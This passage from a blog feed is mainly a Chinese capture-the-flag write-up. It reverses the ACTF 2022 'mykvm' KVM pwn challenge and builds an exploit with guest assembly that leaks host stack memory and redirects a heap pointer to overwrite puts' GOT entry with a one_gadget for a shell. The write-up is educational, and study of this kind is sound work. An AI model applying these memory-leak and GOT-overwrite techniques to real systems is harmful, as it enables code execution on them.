id="Vulnerability-Research-CVs"><a href="#Vulnerability-Research-CVs" class="headerlink" title="Vulnerability Research CVs"></a>Vulnerability Research CVs</h1><p><a href="https://twitter.com/alexjplaskett/status/1552600067231694849">Alex Plaskett on Twitter: “1&#x2F; As someone who has reviewed hundreds of CVs for job applications in the past, I just want to highlight some personal tips for vulnerability researchers in order to maximise their applications (i.e. outside typical career history and education). 🧵 pic.twitter.com&#x2F;S4yEHzHXVn &#x2F; Twitter”</a></p><h1 id="Impactful-books"><a href="#Impactful-books" class="headerlink" title="Impactful books"></a>Impactful books</h1><p><a href="https://twitter.com/alexjplaskett/status/1551173688661536769">Alex Plaskett on Twitter: “I am often asked what books have had the most impact to me in security. This is a really tough question as I have read so many, however, here are some I have have on my shelf and why they were important to me👇 pic.twitter.com&#x2F;Uk5PbXa4gO &#x2F; Twitter”</a></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://twitter.com/alexjplaskett">https://twitter.com/alexjplaskett</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一道CTF题目学习KVM</title>
      <link href="/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/"/>
      <url>/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/</url>
      
        <content type="html"><![CDATA[<p>KVM 全称是基于内核的虚拟机（Kernel-based Virtual Machine），它是Linux 的一个内核模块，KVM基于虚拟化扩展（Intel VT 或者 AMD-V）的 X86 硬件的开源的 Linux 原生的全虚拟化解决方案。</p><p>KVM 本身不执行任何硬件模拟，需要用户空间程序（QEMU）通过 <strong>&#x2F;dev&#x2F;kvm</strong> 接口设置一个客户机虚拟服务器的地址空间，向它提供模拟 I&#x2F;O，并将它的视频显示映射回宿主的显示屏。</p><h1 id="题目逆向分析"><a href="#题目逆向分析" class="headerlink" title="题目逆向分析"></a>题目逆向分析</h1><p>题目来源于ACTF 2022的一道PWN题，给出四个文件，二进制程序在bin文件夹下，其余都是题目部署所用到的文件，可以用docker搭建题目，后面会讲到：</p><pre class="line-numbers language-none"><code class="language-none">├── bin│   ├── mykvm├── ctf.xinetd├── Dockerfile└── start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析二进制文件逻辑，发现代码量并不大，逻辑也很简单：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181539182.png" alt="image-20220629181539182">在函数sub_400B92中，有很多ioctl操作 <strong>&#x2F;dev&#x2F;kvm</strong> 设备文件，但还不知道到底是请求了哪种接口实现了哪种功能：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181615926.png" alt="image-20220629181615926">这里需要了解一下KVM的实现。</p><h1 id="KVM实现"><a href="#KVM实现" class="headerlink" title="KVM实现"></a>KVM实现</h1><p>GitHub有两个简易的KVM例子供参考：</p><p><a href="https://github.com/dpw/kvm-hello-world">https://github.com/dpw/kvm-hello-world</a></p><p><a href="https://github.com/kvmtool/kvmtool">https://github.com/kvmtool/kvmtool</a></p><p>阅读源码后，总结出在主机创建一个KVM的基本步骤如下：</p><ol><li>打开KVM设备</li><li>创建VM</li><li>为Guest设置内存</li><li>创建虚拟CPU</li><li>为vCPU设置内存</li><li>将汇编代码放进用户区域，设置vCPU的寄存器</li><li>运行和处理退出</li></ol><p>下面分步骤介绍。</p><h2 id="step-1-3"><a href="#step-1-3" class="headerlink" title="step 1-3"></a>step 1-3</h2><p>打开KVM设备，创建VM，设置Guest内存。实现代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// step 1, open /dev/kvm</span>  <span class="token keyword">int</span> kvmfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kvm"</span><span class="token punctuation">,</span> O_RDWR<span class="token operator">|</span>O_CLOEXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>kvmfd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"failed to open /dev/kvm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 2, create VM</span>  <span class="token keyword">int</span> vmfd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_CREATE_VM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 3, set up user memory region</span>  <span class="token class-name">size_t</span> mem_size <span class="token operator">=</span> <span class="token number">0x40000000</span><span class="token punctuation">;</span>           <span class="token comment">// size of user memory you want to assign</span>  <span class="token keyword">void</span> <span class="token operator">*</span>mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mem_size<span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token punctuation">,</span>                   MAP_SHARED<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> user_entry <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem <span class="token operator">+</span> user_entry<span class="token punctuation">)</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> code_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_userspace_memory_region</span> region <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span>slot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>guest_phys_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>memory_size <span class="token operator">=</span> mem_size<span class="token punctuation">,</span>    <span class="token punctuation">.</span>userspace_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_SET_USER_MEMORY_REGION<span class="token punctuation">,</span> <span class="token operator">&amp;</span>region<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* end of step 3 */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码创建一个VM，<code>mmap</code>为VM分配0x40000000(1GB)大小，设置<code>user_entry</code>为0，将汇编放在第一页，Guest将从该地址开始执行。</p><h2 id="step-4-6"><a href="#step-4-6" class="headerlink" title="step 4-6"></a>step 4-6</h2><p>创建虚拟CPU，为vCPU设置内存，将汇编代码放进用户区域。实现代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 4~6, 创建和设置 vCPU */</span><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">/* step 1-3 ... */</span>  <span class="token comment">// step 4, create vCPU</span>  <span class="token keyword">int</span> vcpufd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_CREATE_VCPU<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 5, set up memory for vCPU</span>  <span class="token class-name">size_t</span> vcpu_mmap_size <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span> run <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> vcpu_mmap_size<span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> vcpufd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 6, set up vCPU's registers</span>  <span class="token comment">/* standard registers include general-purpose registers and flags */</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_regs</span> regs<span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span>  regs<span class="token punctuation">.</span>rip <span class="token operator">=</span> user_entry<span class="token punctuation">;</span>  regs<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0x200000</span><span class="token punctuation">;</span> <span class="token comment">// stack address</span>  regs<span class="token punctuation">.</span>rflags <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">;</span> <span class="token comment">// in x86 the 0x2 bit should always be set</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set registers</span>  <span class="token comment">/* special registers include segment registers */</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_sregs</span> sregs<span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>  sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>base <span class="token operator">=</span> sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>selector <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// let base of code segment equal to zero</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// not finished ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码创建vCPU，设置寄存器，每个<code>kvm_run</code>结构对应一个vCPU，每个VM可创建多个vCPU。vCPU创建后执行于实模式，也就是说只能执行16位汇编代码，如果需要执行32位或64位，则还需要设置页表。</p><h2 id="step-7"><a href="#step-7" class="headerlink" title="step 7"></a>step 7</h2><p>运行和处理退出。实现代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 7 */</span><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* ... step 1~6 */</span>  <span class="token comment">// step 7, execute vm and handle exit reason</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_RUN<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> KVM_EXIT_HLT<span class="token operator">:</span>      <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"KVM_EXIT_HLT"</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_IO<span class="token operator">:</span>      <span class="token comment">/* TODO: check port and direction here */</span>      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>run<span class="token punctuation">)</span> <span class="token operator">+</span> run<span class="token operator">-></span>io<span class="token punctuation">.</span>data_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_FAIL_ENTRY<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx"</span><span class="token punctuation">,</span>        run<span class="token operator">-></span>fail_entry<span class="token punctuation">.</span>hardware_entry_failure_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_INTERNAL_ERROR<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x"</span><span class="token punctuation">,</span>        run<span class="token operator">-></span>internal<span class="token punctuation">.</span>suberror<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_SHUTDOWN<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_SHUTDOWN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Unhandled reason: %d"</span><span class="token punctuation">,</span> run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>switch</code>语句中，只需要注意两种状态，即<code>KVM_EXIT_HLT</code>和<code>KVM_EXIT_IO</code>，前者由汇编指令<code>hlt</code>触发，会退出VM。后者由汇编指令<code>in/out</code>触发，把字符输出到设备。<code>ioctl(vcpufd, KVM_RUN, NULL)</code>会一直运行，直到退出（如<code>hlt</code>、<code>out</code>、<code>error</code>）</p><h2 id="尝试自己的VM"><a href="#尝试自己的VM" class="headerlink" title="尝试自己的VM"></a>尝试自己的VM</h2><p>接下来我们直接写16位汇编代码，让其运行在VM的实模式下。以下是一个简单的例子，它输出一个字符“a”：</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">.codemov al, <span class="token number">0x61</span>mov dx, <span class="token number">0x217</span>out dx, alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>dx</code> 寄存器赋值0x217是将内容输出到这个串行端口。将其编译成16位汇编代码，可以使用nasm，也可以使用工具网站在线汇编：</p><p><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=&arch=x86-16&as_format=inline#assembly">shell-storm | Online Assembler and Disassembler</a></p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181659435.png" alt="image-20220629181659435"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uint8_t</span> vmcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\xb0\\x61\\xba\\x17\\x02\\xee\\xf4"</span><span class="token function">kvm</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行结果（因为没有输出换行符，所以和<code>KVM_EXIT_HLT</code>连在了一起）：</p><pre class="line-numbers language-none"><code class="language-none">aKVM_EXIT_HLT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="题目逆向分析-1"><a href="#题目逆向分析-1" class="headerlink" title="题目逆向分析"></a>题目逆向分析</h1><p>在了解了KVM的执行原理后，回到题目进行分析。</p><p>因为KVM模块是建立在内核中的，所以知道<code>ioctl</code>的宏定义之后，可以在Linux内核源码进行搜索。以<code>KVM_RUN</code>为例，存在于源码树 <strong>&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;kvm.h</strong> 头文件中，以下是搜索到的结果：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181711623.png" alt="image-20220629181711623">值0x80看起来和题目中的完全不同，看来是<code>_IO(KVMIO, 0x80)</code>对值进行了处理，对于这种复杂的嵌套宏定义，可以直接写一段C代码把它的值打印出来：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;linux/kvm.h></span></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VM 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_USER_MEMORY_REGION 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_USER_MEMORY_REGION<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VCPU 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VCPU<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_VCPU_MMAP_SIZE 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_RUN 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_RUN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">KVM_CREATE_VM 0xae01KVM_SET_USER_MEMORY_REGION 0x4020ae46KVM_CREATE_VCPU 0xae41KVM_GET_VCPU_MMAP_SIZE 0xae04KVM_GET_REGS 0x8090ae81KVM_SET_REGS 0x4090ae82KVM_GET_SREGS 0x8138ae83KVM_SET_SREGS 0x4138ae84KVM_RUN 0xae80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在输出的值就和题目中一样了，可以根据这些值，配合上面的KVM项目源码对程序进行还原，在IDA中创建了结构体并命名变量后就很接近源码，分析起来就很轻松了。最终得到如下内容：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181726045.png" alt="image-20220629181726045"><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220630144839668.png" alt="image-20220630144839668"></p><h1 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h1><p>我这里是Mac + VMware + Ubuntu 16，开启了VT虚拟化也找不到&#x2F;dev&#x2F;kvm，但是ubuntu 18&#x2F;20是有这个设备文件的，VirtualBox也是有设备文件的，但是VirtualBox太卡了，所以最终还是妥协，使用Windows + VMware + ubuntu + docker来执行程序，在Ubuntu中使用docker的原因是尽可能的还原题目的环境，和远程保持一致。在docker中开启1234端口，然后gdbserver监听，在ubuntu中远程调试，启动方法如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">sudo docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">1234</span><span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">-</span>p <span class="token number">8888</span><span class="token operator">:</span><span class="token number">8888</span> <span class="token operator">--</span>privileged <span class="token operator">--</span>cap<span class="token operator">-</span>add<span class="token operator">=</span>SYS_PTRACE mykvmgdbserver <span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">--</span>attach PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><p>程序中最明显的漏洞点在于 <code>size</code> 判断，可发生整数溢出：</p><p>![image-20220629181756669](&#x2F;Users&#x2F;wangzhenghan&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220629181756669.png)但是通过测试的结果，发现这里的漏洞并不能进行利用，在进入<code>run_kvm</code>函数之后有<code>memcpy</code>函数使用这个<code>size</code>，如果<code>size</code>过大会导致<code>memcpy</code>报错程序崩溃。</p><p>还有另一处不太明显的漏洞，存在于<code>run_kvm</code>函数内部，<code>memcpy</code>从栈中拷贝数据到bss段0x603000处，<code>size</code>是我们可控的，虽然栈大小大于可控size 0x1000，但还是不可避免的拷贝了一些宿主机的栈内容到VM中，造成内存泄露，稍后会验证这一点。</p><p>我们可以写一段汇编代码，来遍历整个VM空间，由于是实模式，寻址最多只能20位，所以最多可以遍历0～0xfffff地址的内容，实际上只需要0xffff就足够了，不需要去绞尽脑汁写16位的段寄存器寻址。以下代码会输出VM中0～0xffff内存的所有内容：</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0xffff</span>jne .<span class="token keyword">start</span>hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们可以使用pwntools接收输出内容，并将内容保存成文件，以便分析：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在导出的文件中可以看到一些宿主机地址，大概偏移在0x400附近，证明了之前说过的memcpy把宿主机栈内容拷贝了进来：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181811450.png" alt="image-20220629181811450">也就是说如果我们写汇编代码将偏移位置的值打印出来就可以完成泄露。经过调试偏移，泄露地址的汇编如下：</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0x41e</span>jne .<span class="token keyword">start</span>hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>泄露后有了libc地址，要考虑如何利用。</p><p>程序执行完<code>run_kvm</code>后有一个交互可以输入，并将输入内容拷贝到bss段的<code>dest</code>处，最后调用<code>puts</code>函数后返回：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181825152.png" alt="image-20220629181825152">由于<code>dest</code>存储<code>malloc</code>的一个堆地址，我们可以尝试在VM内存中搜索这个堆地址，计算它在内存中的偏移，就像泄露地址那样，然后在VM中使用汇编对其进行修改，改为got表的地址，在要求输入“host name“时将<code>puts</code>地址改为one_gadget的地址，最后调用<code>puts</code>其实就调用了one_gadget，拿到shell。</p><p>开启ASLR堆地址会发生变化，在搜索的时候不太方便，可以关闭ASLR来保证每次分配的地址都是一样的，方便搜索。我们还是用之前的汇编将内存dump出来，我这里的堆地址0x60b010，找到在偏移0x7100附近：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181837840.png" alt="image-20220629181837840"></p><p>以下是开了ASLR的情况，也是在0x7100附近：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181847463.png" alt="image-20220629181847463"></p><p>经过调试计算得出偏移在0x7100，编写汇编代码，将此处改为got附近的地址，这里将其改为了0x60200d：</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x7100</span>mov al,<span class="token number">0x0d</span>mov [di],almov al,<span class="token number">0x20</span>mov [di<span class="token number">+1</span>],almov al,<span class="token number">0x60</span>mov [di<span class="token number">+2</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+3</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+4</span>],almov al,<span class="token number">0</span>mov [di<span class="token number">+5</span>],alhlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后发现输入完”host name“后，<code>memcpy</code>函数会向0x60200d进行拷贝，证明修改<code>dest</code>成功：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181857455.png" alt="image-20220629181857455">正常来说这里直接修改<code>puts</code>的got就可以了，但还需要考虑一个情况，<code>readline</code>函数会调用<code>malloc</code>，堆管理比较混乱，并且不会读入不可见字符，因此最好是修改<code>puts</code>的最后3个byte成功率会高一些，这也是为什么把写入地址设置为0x60200d的原因。（另外，ASLR对于KVM有一定的影响，在不开启ASLR时，需要泄露的内存偏移在0x9b98，会直接泄露一个<code>main_arena+0x88</code>的地址，成功率100%，但却打不通开了ASLR的情况，具体什么原因还不是很懂，需要进一步的学习）</p><p>最终泄露、写入的汇编代码如下：</p><pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>mov dx,<span class="token number">0x217</span>.<span class="token keyword">start</span>:mov al,[di]out dx,alinc dicmp di,<span class="token number">0x41e</span>jne .<span class="token 